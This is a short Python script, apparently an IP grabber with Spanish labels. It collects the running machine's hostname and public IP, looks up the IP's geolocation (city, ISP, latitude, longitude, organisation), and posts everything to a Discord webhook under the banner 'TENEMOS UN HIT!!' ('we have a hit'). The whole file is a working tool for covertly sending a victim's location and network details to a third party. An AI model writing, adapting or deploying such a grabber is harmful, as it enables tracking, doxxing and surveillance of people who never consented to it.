from dhooks import Webhook, Embed
import socket
import requests
import json

hook = Webhook('')    ## discord webhook link lmao


hostname = socket.gethostname() 

ip = requests.get('https://api.ipify.org/').text 



hook.send(f"**---- TENEMOS UN HIT!! ----**")
r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'Tipo de IP', 'value': geo['ipType']},
    {'name': 'País', 'value': geo['country']},
    {'name': 'Ciudad', 'value': geo['city']},
    {'name': 'Continente', 'value': geo['continent']},
    {'name': 'Hostname', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitud', 'value': geo['lat']},
    {'name': 'Longitud', 'value': geo['lon']},
    {'name': 'Empresa', 'value': geo['org']},
    {'name': 'Región', 'value': geo['region']},
    {'name': 'Estatus', 'value': geo['status']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
hook.send(embed=embed)




